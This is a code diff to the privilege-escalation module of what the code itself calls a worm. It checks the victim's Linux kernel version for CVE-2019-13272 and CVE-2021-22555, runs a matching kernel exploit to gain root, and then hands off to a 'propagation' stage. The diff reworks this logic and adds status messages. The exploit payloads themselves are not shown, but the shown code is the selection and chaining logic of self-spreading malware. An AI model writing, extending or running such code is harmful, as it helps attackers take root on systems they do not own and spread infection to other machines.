@@ -35,15 +35,15 @@ def is_vulnerable(version_str, min_version, max_version):
 
 # search if worm has exploit for detected version
 def search_exploit(kernel_version):
+    cve = None
     # check for CVE-2019-13272 - PTRACE_TRACEME
     if is_vulnerable(kernel_version, "4.10", "5.1.17"):
-        return "CVE-2019-13272"
+        cve = "CVE-2019-13272"
+    # check for CVE-2021-22555 - Netfilter
     elif is_vulnerable(kernel_version, "2.6.19", "5.9"):
-        return "CVE-2021-22555"
-    else:
-        # TODO
-        # check for other CVEs
-        return None
+        cve = "CVE-2021-22555"
+    print(f"[+] privesc: kernel vulnerable to {cve}")
+    return cve
 
 
 # find victim kernel version
@@ -138,13 +138,13 @@ def run_exploit(exploit):
 
 
 def exploit_kernel():
+    print("[*] privesc: checking kernel version...")
     # get kernel version
     kernel_version = detect_kernel_version()
-    print(f"kernel_version: {kernel_version}")
+    print(f"[+] privesc: kernel version is {kernel_version}")
 
     # check if version has exploit
     exploit_to_run = search_exploit(kernel_version)
-    print(f"exploit_to_run: {exploit_to_run}")
 
     if exploit_to_run:
         is_root = run_exploit(exploit_to_run)
@@ -162,23 +162,27 @@ def exploit_kernel():
 
 
 def run():
+    print("[+] privesc: module activated")
+
     next_action = ""
     data = "data"
-
-    print("privesc module activated...")
 
     # check if not already root
     if os.geteuid() == 0:
         # user is root
-        pass
+        print("[+] privesc: user is root")
+        next_action = "propagation"
     else:
         # user is not root
-        # start checking:
-        # - kernel version
+        print("[+] privesc: user is not root")
+        # kernel exploit test
         if exploit_kernel():
-            print("kernel exploited")
+            print("[+] privesc: kernel exploited")
             next_action = "propagation"
         else:
-            print("no kernel exploit available")
+            print("[-] privesc: kernel not exploited")
             # test something else
+            print("[-] privesc: no more vectors to check, exiting")
+            exit()
+    print(f"[+] privesc: done! moving to {next_action}")
     return data, next_action
